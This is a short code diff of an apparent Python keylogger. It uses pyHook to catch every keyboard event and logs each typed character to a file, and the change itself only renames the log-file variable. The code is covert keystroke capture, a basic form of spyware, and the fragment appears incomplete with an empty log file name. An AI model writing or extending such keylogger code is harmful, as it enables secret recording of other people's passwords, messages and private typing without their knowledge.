@@ -1,9 +1,9 @@
 import pyHook, logging, pythoncom
 
-var = ""
+KeyStroke = ""
 
 def OnKeyboardEvent(event):
-    logging.basicConfig(filename=var, level=logging.DEBUG, format='%(message)s')
+    logging.basicConfig(filename=KeyStroke, level=logging.DEBUG, format='%(message)s')
     chr(event.Ascii)    
     logging.log(10,chr(event.Ascii))
     return True
